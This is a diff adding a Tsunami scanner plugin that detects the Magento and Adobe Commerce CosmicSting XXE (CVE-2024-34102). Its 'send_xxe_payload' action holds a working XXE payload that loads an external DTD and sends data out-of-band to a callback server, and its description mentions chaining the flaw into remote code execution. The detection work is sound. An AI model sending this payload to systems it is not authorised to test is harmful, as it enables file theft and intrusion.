@@ -1,0 +1,135 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MagentoCosmicSting_CVE_2024_34102"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version,"
+    " Savino Sisco (savio@doyensec.com) for the original Java version"
+  version: "2.0"
+}
+
+# finding ID changed from Java version to be more consistent with the rest of them.
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2024_34102"
+  }
+  severity: CRITICAL
+  title: "Magento & Adobe Commerce CosmicSting XXE (CVE-2024-34102)"
+  description: 
+    "The scanner detected a Magento or Adobe Commerce instance vulnerable to the CosmicSting XXE"
+    " (CVE-2024-34102). The vulnerability can be exploited by sending an unauthenticated"
+    " HTTP request with a crafted XML file that references external entities; when the"
+    " request payload is deserialized, the attacker can extract sensitive files from the"
+    " system and gain administrative access to the software. Remote Code Execution (RCE)"
+    " can be accomplished by combining this issue with another vulnerability, such as the"
+    " PHP iconv RCE (CVE-2024-2961). An exploit that leverages both vulnerabilities to"
+    " achieve RCE on unpatched Magento is publicly available.\n"
+    "See: https://nvd.nist.gov/vuln/detail/CVE-2024-34102 or"
+    " https://helpx.adobe.com/security/products/magento/apsb24-40.html for more"
+    " information.\n Credit to Assetnote for the public POC: "
+    " https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102 \n"
+  recommendation: 
+    "Install the latest security patches and rotate your encryption keys. More detailed"
+    " instructions can be found in the official Adobe security bulletin:"
+    " https://helpx.adobe.com/security/products/magento/apsb24-40.html."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-34102"
+  }
+}
+
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_magento"
+  http_request: {
+    method: GET
+    uri: "/rest/default/V1/directory/currency"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "base_currency_code" }
+        ]
+      }
+    }
+  }
+}
+
+# we don't care about the response for this request since 
+# we can check callback server
+
+actions: {
+  name: "send_xxe_payload"
+  http_request: {
+    method: POST
+    uri: "/rest/all/V1/guest-carts/test-assetnote/estimate-shipping-methods"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/json"}
+    ]
+    data: 
+      '{'
+      '  "address": {'
+      '    "totalsReader": {'
+      '      "collectorList": {'
+      '        "totalCollector": {'
+      '          "sourceData": {'
+      '            "data": "<?xml version=\\"1.0\\" ?><!DOCTYPE r [<!ELEM'
+      'ENT r ANY ><!ENTITY % oob \\"{{ T_CBS_URI }}\\"><!ENTITY % sp SYST'
+      'EM \\"https://raw.githubusercontent.com/google/tsunami-security-scann'
+      'er-plugins/master/payloads/magento-cosmicsting-xxe/dtd.xml\\">%sp;'
+      '%param1;]><r>&exfil;</r>",'
+      '            "options": 16'
+      '          }'
+      '        }'
+      '      }'
+      '    }'
+      '  }'
+      '}'
+  }
+}
+
+
+# OOB sleep and check callback server steps
+# since we already fingerprinted we can do a long sleep here.
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 5000 } }
+}
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+# This is only out of band detection. For non-oob checks, the original
+# plugin matched responses that could have different codes, so that part 
+# isn't feasible yet in the template engine.
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_magento",
+    "send_xxe_payload",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
